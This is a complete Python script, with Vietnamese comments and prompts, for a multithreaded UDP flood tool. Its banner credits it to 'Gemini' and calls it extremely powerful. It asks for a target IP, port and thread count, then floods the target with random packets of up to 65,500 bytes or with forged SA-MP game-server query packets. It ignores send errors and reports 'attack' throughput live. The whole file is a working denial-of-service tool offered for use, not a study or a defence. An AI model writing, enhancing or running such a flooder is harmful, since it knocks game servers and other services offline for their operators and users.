import socket
import threading
import os
import random
import time

# Biến toàn cục để theo dõi thống kê
stats = {
    "packets_sent": 0,
    "bytes_sent": 0,
    "lock": threading.Lock()
}
stop_event = threading.Event()

def print_banner():
    """Hiển thị banner giới thiệu."""
    banner = """
===================================================================
   UDP Packet Sender - Phiên bản Cực Mạnh & Màu Mè by Gemini
===================================================================
    """
    print(banner)

def udp_sender(target_ip, target_port, packet_size, use_samp_query):
    """Hàm gửi gói tin UDP, chạy trong mỗi luồng."""
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        samp_opcodes = [b'i', b'r', b'c', b'd', b'p'] # Info, Rules, Clients, Detailed info, Ping
        
        while not stop_event.is_set():
            try:
                if use_samp_query:
                    # Tạo gói tin truy vấn SA-MP hợp lệ với opcode ngẫu nhiên
                    ip_bytes = bytes(map(int, target_ip.split('.')))
                    port_bytes = target_port.to_bytes(2, 'little')
                    opcode = random.choice(samp_opcodes)
                    packet = b'SAMP' + ip_bytes + port_bytes + opcode
                else:
                    # Tạo gói tin ngẫu nhiên với kích thước tùy chỉnh
                    packet = os.urandom(packet_size)

                # Gửi gói tin
                sent_bytes = udp_socket.sendto(packet, (target_ip, target_port))
                
                # Cập nhật thống kê một cách an toàn
                with stats['lock']:
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += sent_bytes
            
            except socket.error:
                # Bỏ qua lỗi socket và tiếp tục
                pass
    finally:
        udp_socket.close()

def stats_display(start_time, target_ip, target_port, thread_count):
    """Hiển thị thống kê tấn công thời gian thực."""
    print(f"\n[+] Bắt đầu gửi gói tin đến {target_ip}:{target_port} với {thread_count} luồng.")
    print(f"-------------------------------------------------------------------")
    
    while not stop_event.is_set():
        try:
            time.sleep(1)
            elapsed_time = time.time() - start_time
            if elapsed_time == 0: continue

            with stats['lock']:
                packets_per_second = stats['packets_sent'] / elapsed_time
                mb_sent = stats['bytes_sent'] / (1024 * 1024)
                mb_per_second = mb_sent / elapsed_time

            # In trên cùng một dòng
            print(
                f"\r[INFO] Pkts/s: {packets_per_second:,.2f} | "
                f"Tốc độ: {mb_per_second:,.2f} MB/s | "
                f"Tổng gửi: {mb_sent:,.2f} MB | "
                f"Thời gian: {int(elapsed_time)}s  ",
                end=""
            )
        except KeyboardInterrupt:
            break

def main():
    """Hàm chính để nhận thông tin và quản lý các luồng."""
    print_banner()

    try:
        target_ip = input("Nhập địa chỉ IP của máy chủ: ")
        target_port = int(input("Nhập cổng của máy chủ: "))
        thread_count = int(input("Nhập số luồng (threads): "))
        
        samp_choice = input("Sử dụng gói tin truy vấn SA-MP (ssv)? (y/n): ").lower()
        use_samp_query = samp_choice == 'y'

        packet_size = 0
        if not use_samp_query:
            packet_size = int(input("Nhập kích thước gói tin (bytes, tối đa 65500): "))
            if packet_size > 65500:
                packet_size = 65500
                print("[!] Kích thước gói tin quá lớn, đã tự động giảm xuống 65500 bytes.")
        
    except (ValueError, IndexError):
        print("\n[ERROR] Đầu vào không hợp lệ. Vui lòng chạy lại chương trình.")
        return

    threads = []
    
    print("\nĐang chuẩn bị các luồng...")

    # Tạo và bắt đầu các luồng gửi
    for _ in range(thread_count):
        thread = threading.Thread(target=udp_sender, args=(target_ip, target_port, packet_size, use_samp_query))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
    start_time = time.time()

    # Tạo và bắt đầu luồng hiển thị thống kê
    stats_thread = threading.Thread(target=stats_display, args=(start_time, target_ip, target_port, thread_count))
    stats_thread.daemon = True
    stats_thread.start()

    try:
        # Giữ chương trình chạy
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n\n[!] Đã nhận tín hiệu dừng (Ctrl+C). Đang cho các luồng kết thúc...")
        stop_event.set()
        
        # Chờ các luồng gửi kết thúc
        for thread in threads:
            thread.join()
        
        # Chờ luồng thống kê kết thúc
        stats_thread.join(timeout=1.2)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        print(f"\n-------------------------------------------------------------------")
        print(f"[SUCCESS] Tất cả các luồng đã dừng.")
        print(f"========== TỔNG KẾT ==========")
        print(f"Tổng thời gian chạy: {total_time:,.2f} giây")
        print(f"Tổng số gói tin đã gửi: {stats['packets_sent']:,}")
        print(f"Tổng dung lượng đã gửi: {stats['bytes_sent'] / (1024*1024):,.2f} MB")
        print(f"=============================")


if __name__ == "__main__":
    main()